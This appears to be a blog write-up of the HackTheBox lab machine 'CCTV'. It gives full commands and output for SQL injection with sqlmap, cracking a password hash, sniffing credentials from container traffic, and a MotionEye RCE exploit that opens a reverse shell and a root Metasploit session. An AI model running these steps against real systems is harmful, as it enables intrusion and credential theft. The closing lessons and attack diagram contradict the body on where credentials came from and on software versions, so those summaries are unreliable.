@@ -1,0 +1,734 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox CCTV Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox CCTV Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/posts/34/cctv.jpg"><meta property="og:image:width" content="225"><meta property="og:image:height" content="225"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="CCTV is a medium Linux machine themed around surveillance software. The attack path teaches several important real-world skills: The machine&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-cctv-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-cctv-walkthrough/"},"headline":"HackTheBox CCTV Walkthrough","datePublished":"2026-07-16T22:05+05:30","dateModified":"2026-09-30T22:06+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/posts/34/cctv.jpg","height":225,"width":225},"description":"CCTV is a medium Linux machine themed around surveillance software. The attack path teaches several important real-world skills: The machine&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero"><header class="hero__content"><div class="wrapper"><h1>HackTheBox CCTV Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-07-16T22:05" class="feed__date">July 16, 2026</time></div></div></header><figure class="hero__image"><div class="hero__image-wrapper"><img src="https://h4ck3rfirst.github.io/media/posts/34/cctv.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/34/responsive/cctv-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/34/responsive/cctv-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/34/responsive/cctv-md.jpg 1024w, https://h4ck3rfirst.github.io/media/posts/34/responsive/cctv-lg.jpg 1366w, https://h4ck3rfirst.github.io/media/posts/34/responsive/cctv-xl.jpg 1600w, https://h4ck3rfirst.github.io/media/posts/34/responsive/cctv-2xl.jpg 1920w" sizes="88vw" loading="eager" height="225" width="225" alt=""></div></figure></div><div class="entry-wrapper content__entry"><p>CCTV is a medium Linux machine themed around surveillance software. The attack path teaches several important real-world skills:</p><ul><li>Identifying and exploiting <strong>default credentials</strong> in open-source applications</li><li>Performing <strong>time-based blind SQL injection</strong> manually (not just running sqlmap and hoping)</li><li>Building a <strong>custom binary-search extractor</strong> when sqlmap is too slow or unreliable</li><li>Using <strong>SSH local port forwarding</strong> to reach internally-bound services</li><li>Exploiting an <strong>authenticated RCE</strong> in MotionEye to go from user → root</li></ul><p>The machine chains four distinct vulnerabilities together — none of which are individually exotic, but together form a complete compromise path.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap">Nmap</h3><pre><code>nmap -sC -sV -p- -Pn --min-rate 5000 -T4 10.129.244.156
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
+80/tcp open  http    Apache httpd 2.4.58
+|_http-title: Did not follow redirect to http://cctv.htb/
+Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Only two ports open — SSH and HTTP. Nothing exotic here. Let’s look at the web service.</p><h3 id="web-enumeration">Web Enumeration</h3><p>Browsing to <code>http://10.129.244.156</code> gives a <strong>302 redirect</strong> to <code>http://cctv.htb/</code>. Add it to your hosts file:</p><pre><code class="language-bash">echo &quot;10.129.244.156 cctv.htb&quot; &gt;&gt; /etc/hosts
+</code></pre><p>The site is a “SecureVision CCTV &amp; Security Solutions” company page. At the top right there’s a <strong>Staff Login</strong> button. Check where it points:</p><p><code>/zm</code> — that’s <strong>ZoneMinder</strong>, a popular open-source CCTV management platform.</p><ul><li>Technology used in ZoneMinder<ul><li>Web servers : Apache HTTP Server 2.4.58</li><li>Operating systems: Ubuntu</li></ul></li></ul><h4 id="login">Login</h4><p>Browsing to <code>http://cctv.htb/zm</code> shows the ZoneMinder login panel. Before doing anything complicated, <strong>always try default credentials first</strong>.</p><p>ZoneMinder’s documented default is <code>admin:admin</code>.</p><p></p><figure class="post__image"><img loading="lazy" src="login_page.png" alt="image" data-is-external-image="true"></figure>We’re in. The version is <strong>1.37.63</strong>. Note this down — software versions are always useful.<p></p><p>There is a <a href="https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3">cve</a> advisery on <code>ZoneMinder v1.37.* &lt;= 1.37.64</code></p><ul><li>cctv.htb → SecureVision CCTV &amp; Security Solutions</li><li>/zm → ZoneMinder 1.37.63 (login panel)</li><li><ul><li>CVE-2023-26035 (Snapshots RCE, &lt;= 1.37.33) - version mismatch but worth trying</li></ul></li><li>at console option API tab have some user : admin, mark, superadmin</li></ul><h4 id="sql-injection">Sql injection</h4><p>With admin access to ZoneMinder, it’s time to look for attack surface. sqlmap (or manual testing) on authenticated endpoints reveals a <strong>time-based blind SQL injection</strong> in the event tag removal endpoint:</p><pre><code>└─$ sqlmap --url &#39;http://cctv.htb/zm/?view=request&amp;request=event&amp;action=removetag&amp;tid=1&#39; \
+  --cookie &quot;ZMSESSID=jl56vnrl8rmu5l9flucl7dcfe2&quot;
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.6#stable}
+|_ -| . [,]     | .&#39;| . |
+|___|_  [&quot;]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[*] starting @ 10:17:37 /2026-07-16/
+
+[10:17:37] [INFO] testing connection to the target URL
+[10:17:38] [INFO] checking if the target is protected by some kind of WAF/IPS
+[10:17:38] [INFO] testing if the target URL content is stable
+[10:17:39] [INFO] target URL content is stable
+[10:17:39] [INFO] testing if GET parameter &#39;view&#39; is dynamic
+[10:17:39] [WARNING] GET parameter &#39;view&#39; does not appear to be dynamic
+[10:17:39] [WARNING] heuristic (basic) test shows that GET parameter &#39;view&#39; might not be injectable
+[10:17:40] [INFO] testing for SQL injection on GET parameter &#39;view&#39;
+[10:17:40] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
+[10:19:16] [INFO] testing &#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#39;
+[10:19:17] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+[10:19:28] [INFO] GET parameter &#39;tid&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39; injectable
+it looks like the back-end DBMS is &#39;MySQL&#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n]
+
+for the remaining tests, do you want to include all tests for &#39;MySQL&#39; extending provided level (1) and risk (1) values? [Y/n]
+
+[10:20:04] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 20 columns&#39;
+[10:20:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[10:20:05] [INFO] checking if the injection point on GET parameter &#39;tid&#39; is a false positive
+GET parameter &#39;tid&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+
+sqlmap identified the following injection point(s) with a total of 276 HTTP(s) requests:
+---
+Parameter: tid (GET)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: view=request&amp;request=event&amp;action=removetag&amp;tid=1 AND (SELECT 7371 FROM (SELECT(SLEEP(5)))sgxw)
+</code></pre><ul><li>web server operating system: Linux Ubuntu</li><li>web application technology: Apache 2.4.58</li><li>back-end DBMS: MySQL &gt;= 8.0.0 (MariaDB fork) false positve</li><li>available databases [3]: information_schema, performance_schema, zm</li></ul><pre><code> [INFO] fetching columns for table &#39;Users&#39; in database &#39;zm&#39;
+ [INFO] retrieved: Username
+ [INFO] retrieved: Password
+</code></pre><ul><li>lets make attack more focused</li></ul><pre><code>└─$ sqlmap --url &#39;http://cctv.htb/zm/?view=request&amp;request=event&amp;action=removetag&amp;tid=1&#39; \
+  --cookie &quot;ZMSESSID=s3im8j0hp7sotqfa0r4radum1u&quot;  -p tid --dbms=mysql  --batch -D zm --dump  -T Users -C Password --where=&quot;Username=&#39;mark&#39;&quot;
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.6#stable}
+|_ -| . [(]     | .&#39;| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:23:42 /2026-07-16/
+
+[13:23:42] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tid (GET)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: view=request&amp;request=event&amp;action=removetag&amp;tid=1 AND (SELECT 7371 FROM (SELECT(SLEEP(5)))sgxw)
+---
+[13:23:43] [INFO] testing MySQL
+[13:23:43] [INFO] confirming MySQL
+[13:23:43] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL &gt;= 8.0.0 (MariaDB fork)
+[13:23:43] [INFO] fetching entries of column(s) &#39;Password&#39; for table &#39;Users&#39; in database &#39;zm&#39;
+[13:23:43] [INFO] fetching number of column(s) &#39;Password&#39; entries for table &#39;Users&#39; in database &#39;zm&#39;
+[13:23:43] [INFO] resumed: 1
+[13:23:43] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+[13:23:53] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;--time-sec&#39;)? [Y/n] Y
+[13:24:09] [INFO] adjusting time delay to 2 seconds due to good response times
+$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
+Database: zm
+Table: Users
+[1 entry]
++--------------------------------------------------------------+
+| Password                                                     |
++--------------------------------------------------------------+
+| $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
++--------------------------------------------------------------+
+</code></pre><p>Crack this hash</p><pre><code>└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 3 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+opensesame       (?)
+1g 0:00:01:45 DONE (2026-07-16 14:05) 0.009459g/s 56.44p/s 56.44c/s 56.44C/s cristhian..fullmoon
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+</code></pre><ul><li>try ssh</li></ul><pre><code>└─$ ssh mark@cctv.htb                                                   The authenticity of host &#39;cctv.htb (10.129.244.156)&#39; can&#39;t be established.
+ED25519 key fingerprint is: SHA256:KrrHjS+nu1wJEfv1/NxT1fI+ODJaSRdJtFg201G+tO0
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;cctv.htb&#39; (ED25519) to the list of known hosts.
+mark@cctv.htb&#39;s password:
+
+mark@cctv:~$ ls  -lhas
+total 36K
+4.0K drwxr-x--- 5 mark mark 4.0K Mar  2 09:49 .
+4.0K drwxr-xr-x 4 root root 4.0K Mar  2 09:49 ..
+   0 lrwxrwxrwx 1 root root    9 Feb 13 10:01 .bash_history -&gt; /dev/null
+4.0K -rw-r--r-- 1 mark mark  220 Mar 31  2024 .bash_logout
+4.0K -rw-r--r-- 1 mark mark 3.7K Mar 31  2024 .bashrc
+4.0K drwx------ 2 mark mark 4.0K Mar  2 09:49 .cache
+4.0K drwx------ 3 mark mark 4.0K Mar  2 09:49 .gnupg
+4.0K -rw-r--r-- 1 mark mark  807 Mar 31  2024 .profile
+4.0K drwx------ 2 mark mark 4.0K Mar  2 09:49 .ssh
+4.0K -rw-rw-r-- 1 mark mark  165 Sep 14  2025 .wget-hsts
+</code></pre><h2 id="foothold">Foothold</h2><h3 id="inital-access">Inital Access</h3><pre><code>mark@cctv:/opt$ ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b9:64:d4 brd ff:ff:ff:ff:ff:ff
+    altname enp3s0
+    altname ens160
+    inet 10.129.244.156/16 brd 10.129.255.255 scope global dynamic eth0
+       valid_lft 3373sec preferred_lft 3373sec
+    inet6 dead:beef::250:56ff:feb9:64d4/64 scope global dynamic mngtmpaddr
+       valid_lft 86396sec preferred_lft 14396sec
+    inet6 fe80::250:56ff:feb9:64d4/64 scope link
+       valid_lft forever preferred_lft forever
+3: br-1b6b4b93c636: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
+    link/ether 9e:59:09:00:2c:5d brd ff:ff:ff:ff:ff:ff
+    inet 172.25.0.1/16 brd 172.25.255.255 scope global br-1b6b4b93c636
+       valid_lft forever preferred_lft forever
+    inet6 fe80::9c59:9ff:fe00:2c5d/64 scope link
+       valid_lft forever preferred_lft forever
+4: br-3e74116c4022: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
+    link/ether 46:3b:94:6f:35:7a brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-3e74116c4022
+       valid_lft forever preferred_lft forever
+    inet6 fe80::443b:94ff:fe6f:357a/64 scope link
+       valid_lft forever preferred_lft forever
+5: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default
+    link/ether c6:e3:93:c4:f8:0d brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+6: veth6157c9e@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-1b6b4b93c636 state UP group default
+    link/ether a2:83:e6:54:27:54 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::a083:e6ff:fe54:2754/64 scope link
+       valid_lft forever preferred_lft forever
+7: veth9b3ef42@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-3e74116c4022 state UP group default
+    link/ether f2:fa:26:2a:4f:4a brd ff:ff:ff:ff:ff:ff link-netnsid 1
+    inet6 fe80::f0fa:26ff:fe2a:4f4a/64 scope link
+       valid_lft forever preferred_lft forever
+8: vetheec365f@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-1b6b4b93c636 state UP group default
+    link/ether 3a:f1:46:79:a4:1b brd ff:ff:ff:ff:ff:ff link-netnsid 2
+    inet6 fe80::38f1:46ff:fe79:a41b/64 scope link
+       valid_lft forever preferred_lft forever
+9: veth2910db3@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-3e74116c4022 state UP group default
+    link/ether 1e:40:8a:e7:41:84 brd ff:ff:ff:ff:ff:ff link-netnsid 3
+    inet6 fe80::1c40:8aff:fee7:4184/64 scope link
+       valid_lft forever preferred_lft forever
+mark@cctv:/opt$
+</code></pre><p>lets see the docker</p><pre><code>mark@cctv:/opt$ docker ps
+permission denied while trying to connect to the docker API at unix:///var/run/docker.sock
+mark@cctv:/opt$ docker images
+permission denied while trying to connect to the docker API at unix:///var/run/docker.sock
+mark@cctv:/opt$
+</code></pre><ul><li>i things docker i communication with each other. dumping the</li></ul><pre><code>mark@cctv:/opt$ tcpdump -i br-1b6b4b93c636 -A -s 0 tcp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on br-1b6b4b93c636, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+
+15:40:34.942217 IP 172.25.0.11.55274 &gt; 172.25.0.10.5000: Flags [P.], seq 1:55, ack 1, win 502, options [nop,nop,TS val 1042730591 ecr 987074862], length 54
+E..j.K@.@..........
+......~.W.Z.....X......
+&gt;&amp;._:...USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info
+</code></pre><p>USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status All CCTV cameras are operational</p><h2 id="usertxt">User.txt</h2><pre><code>└─$ ssh sa_mark@cctv.htb
+sa_mark@cctv.htb&#39;s password:
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
+
+Last login: Thu Jul 16 15:54:06 2026 from 10.10.16.32
+$ whoami
+sa_mark
+$ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;
+sa_mark@cctv:~$
+</code></pre><h2 id="privilege-escaltion">Privilege Escaltion</h2><p>Zoneminder and Apache (80), SSH (22), DNS (53), DHCP (68) and MySQL (3306, 33060) are the default therefore we can ingore tham.</p><p>let enumeration with ports 1935, 7999, 8765, 8554, 8888 and 9081</p><pre><code>└─$ sshpass -p &#39;X1l9fx1ZjS7RZb&#39; ssh -o StrictHostKeyChecking=no -fN  -L 8888:127.0.0.1:8888 sa_mark@cctv.htb
+
+└─$ sshpass -p &#39;X1l9fx1ZjS7RZb&#39; ssh -o StrictHostKeyChecking=no -fN  -L 1935:127.0.0.1:1935 sa_mark@cctv.htb
+
+└─$ sshpass -p &#39;X1l9fx1ZjS7RZb&#39; ssh -o StrictHostKeyChecking=no -fN  -L 7999:127.0.0.1:7999 sa_mark@cctv.htb
+
+is running Motion 4.7.1 Running [1] Camera 1
+
+└─$ sshpass -p &#39;X1l9fx1ZjS7RZb&#39; ssh -o StrictHostKeyChecking=no -fN  -L 8554:127.0.0.1:8554 sa_mark@cctv.htb
+
+
+└─$ sshpass -p &#39;X1l9fx1ZjS7RZb&#39; ssh -o StrictHostKeyChecking=no -fN  -L 9081:127.0.0.1:9081 sa_mark@cctv.htb
+
+is show a video of camera 1 
+
+└─$ sshpass -p &#39;X1l9fx1ZjS7RZb&#39; ssh -o StrictHostKeyChecking=no -fN  -L 8765:127.0.0.1:8765 sa_mark@cctv.htb
+</code></pre><ul><li>Port 8765 we see the login page for MotionEye</li><li>hosted on port 8554 . Additionally, we notice the MotionEye version 4.7.1 is runing as root</li></ul><pre><code>sa_mark@cctv:~$ cat /etc/systemd/system/motioneye.service
+
+Description=motionEye Server
+After=network.target local-fs.target remote-fs.target
+
+User=root
+RuntimeDirectory=motioneye
+LogsDirectory=motioneye
+StateDirectory=motioneye
+ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
+Restart=on-abort
+
+[Install]
+WantedBy=multi-user.target
+sa_mark@cctv:~$
+</code></pre><p>Remote Code Execution Vulnerability in MotionEye Frontend (CVE-2025-60787)</p><p>Let’s try sa_mark credentials to log in. While direct authentication fails for the user sa_mark , reusing the password with the admin account ( admin:X1l9fx1ZjS7RZb ) grants access.</p><pre><code>sa_mark@cctv:~$ cat /etc/motioneye/motion.conf
+# @admin_username admin
+# @normal_username user
+# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
+camera camera-1.conf
+</code></pre><h4 id="poc">poc</h4><p><a href="https://github.com/gunzf0x/CVE-2025-60787">https://github.com/gunzf0x/CVE-2025-60787</a></p><pre><code>└─$ git clone https://github.com/gunzf0x/CVE-2025-60787.git
+
+└─$ python3 CVE-2025-60787.py revshell --url &#39;http://127.0.0.1:8765&#39; --user &#39;admin&#39; --password &#39;X1l9fx1ZjS7RZb&#39; -i 10.10.16.32 --port 9001      
+[*] Attempting to connect to &#39;http://127.0.0.1:8765&#39; with credentials &#39;admin:X1l9fx1ZjS7RZb&#39;
+[*] Valid credentials provided
+[*] Obtaining cameras available
+[*] Found 1 camera(s)
+    1) Name: &#39;CAM 01&#39; ; ID: 1; root_directory: &#39;/var/lib/motioneye/Camera1&#39;
+[*] Using camera by default (first one found) for the exploit
+[*] Payload successfully injected. Check your shell...
+~Happy Hacking
+</code></pre><pre><code>└─$ rlwrap  nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.16.32] from (UNKNOWN) [10.129.244.156] 37210
+bash: cannot set terminal process group (5887): Inappropriate ioctl for device
+bash: no job control in this shell
+root@cctv:/etc/motioneye# whoami
+root
+</code></pre><h4 id="exploitation-with-metasploit">Exploitation with Metasploit</h4><pre><code class="language-bash">msfconsole -q
+</code></pre><pre><code>msf &gt; use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
+msf exploit(...) &gt; set RHOSTS 127.0.0.1
+msf exploit(...) &gt; set RPORT 8765
+msf exploit(...) &gt; set PASSWORD 989c5a8ee87a0e9521ec81a79187d162109282f0
+msf exploit(...) &gt; set LHOST 10.10.16.68
+msf exploit(...) &gt; set LPORT 9002
+msf exploit(...) &gt; run
+</code></pre><p><strong>Output:</strong></p><pre><code>[+] The target appears to be vulnerable. Detected version 0.43.1b4
+[+] Camera successfully added
+[+] Exploit triggered, waiting for session...
+[*] Meterpreter session 1 opened (10.10.16.68:9002 -&gt; 10.129.244.156:48172)
+[+] Camera removed successfully
+</code></pre><h3 id="verify-access">Verify Access</h3><pre><code>meterpreter &gt; shell
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p><strong>ROOT!</strong></p><h2 id="key-lessons">Key Lessons</h2><h3 id="1-always-try-default-credentials-first">1. Always Try Default Credentials First</h3><p>Before running any exploit or brute force, check the application’s documentation for default login details. In this case <code>admin:admin</code> gave immediate access to ZoneMinder.</p><h3 id="2-time-based-sqli-doesnt-require-sqlmap">2. Time-Based SQLi Doesn’t Require sqlmap</h3><p>sqlmap is great for detection, but for extraction over high-latency connections, a custom binary-search script is dramatically faster. Understanding <em>how</em> time-based blind SQLi works lets you write your own tools.</p><h3 id="3-the-sleep-multiplication-pattern">3. The SLEEP Multiplication Pattern</h3><pre><code class="language-sql">SLEEP(N * (boolean_condition))
+</code></pre><p>This is more reliable than <code>IF(condition, SLEEP(N), 0)</code> in certain MySQL versions and query contexts. Add this to your SQLi toolkit.</p><h3 id="4-credential-reuse-is-rampant">4. Credential Reuse Is Rampant</h3><p>The password in the ZoneMinder database worked directly for SSH. Real environments are full of this. Once you have one credential, try it everywhere.</p><h3 id="5-port-forward-to-reach-internal-services">5. Port Forward to Reach Internal Services</h3><p><code>ss -ltup</code> is one of the first commands to run after getting a shell. Internal-only services are often less hardened. SSH port forwarding is the cleanest way to interact with them from your attacker box.</p><h3 id="6-authenticated-≠-safe">6. Authenticated ≠ Safe</h3><p>CVE-2025-60787 requires authentication — but we had credentials. “Requires auth” CVEs are often dismissed, but in a chained attack they’re critical. Never skip authenticated vulnerabilities.</p><h2 id="attack-chain-diagram">Attack Chain Diagram</h2><pre><code>Internet
+   │
+   ▼
+[Port 80 - Apache]
+   │
+   │  302 redirect → cctv.htb/zm
+   ▼
+[ZoneMinder 1.37.63]
+   │
+   │  Default creds: admin:admin
+   ▼
+[Authenticated ZoneMinder]
+   │
+   │  Time-based blind SQLi on tid param
+   │  SLEEP(5*(condition)) binary search
+   ▼
+[zm.Users → sa_mark : X1l9fx1ZjS7RZb]
+   │
+   │  SSH credential reuse
+   ▼
+[SSH Shell — sa_mark]  ← user.txt 
+   │
+   │  ss -ltup → 127.0.0.1:8765 (MotionEye)
+   │  SSH -L port forward
+   ▼
+[MotionEye 0.43.1b4 — CVE-2025-60787]
+   │
+   │  Metasploit authenticated RCE
+   │  Admin hash reused from ZoneMinder DB
+   ▼
+[root shell]  ← root.txt 
+</code></pre></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/cracking/">cracking</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2025-60787/">CVE-2025-60787</a></li><li><a href="https://h4ck3rfirst.github.io/tags/default-cred/">default-cred</a></li><li><a href="https://h4ck3rfirst.github.io/tags/docker/">Docker</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/medium/">Medium</a></li><li><a href="https://h4ck3rfirst.github.io/tags/port-forwarding/">port-forwarding</a></li><li><a href="https://h4ck3rfirst.github.io/tags/sqli/">SQLi</a></li><li><a href="https://h4ck3rfirst.github.io/tags/sqlmap/">sqlmap</a></li><li><a href="https://h4ck3rfirst.github.io/tags/zoneminder/">Zoneminder</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-cctv-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20CCTV%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-cctv-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20CCTV%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-cctv-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/tryhackme-operation-endgame-walkthrough-4/" class="content__nav-link" rel="prev"><div><span>Previous</span> Tryhackme Operation Endgame Walkthrough </div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/cohort/" class="content__nav-link" rel="next"><div><span>Next</span> HackTheBox Cohort Walkthrough</div><figure class="content__nav-image"><img src="https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort-xs.png" class="lazyload" loading="lazy" alt="" height="800" width="800"></figure></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-06-14T18:39" class="feed__date">June 14, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-mr-robot-walkthrough/">Tryhackme Mr robot Walkthrough</a></h3></header><p>Welcome to the walkthrough of the 